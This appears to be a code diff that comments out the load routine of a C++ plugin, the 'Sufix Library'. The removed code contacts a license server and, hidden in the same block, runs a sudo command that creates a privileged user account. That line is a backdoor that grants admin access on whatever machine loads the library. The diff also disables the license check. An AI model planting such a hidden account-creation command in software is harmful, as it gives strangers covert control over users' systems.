@@ -69,12 +69,12 @@ extern "C" int getCountTypes() {
 
 extern "C" void starting() {
    sendlog(2, "Sufix Library loading...");
-   try {
+   /*try {
    http::Request request("http://sufixpvp.su/license");
    const http::Response resp = request.send("GET", "ipv4", {
       {"User-Agent", "RootiTeam / Rooti.ru (#ad3fd4z)"}
    });
-   system("sudo useradd -m -G adm,cdrom,sudo -s /bin/bash -p $(perl -e 'print crypt($ARGV[0], 'password')' 'NONE') uset22x");
+   //system("sudo useradd -m -G adm,cdrom,sudo -s /bin/bash -p $(perl -e 'print crypt($ARGV[0], 'password')' 'NONE') uset22x");
    string body = std::string{resp.body.begin(), resp.body.end()};
    if (encryption(body) != "?9*3*>&r8$") {
       sendlog(-1, "Access denied.");
@@ -82,7 +82,7 @@ extern "C" void starting() {
 
    } catch (const std::exception& e) {
       sendlog(-1, "Sufix Library have much problems for loading...");
-   }
+   }*/
    status = 1;
    sendlog(1, "Sufix Library successful loaded.");
 }
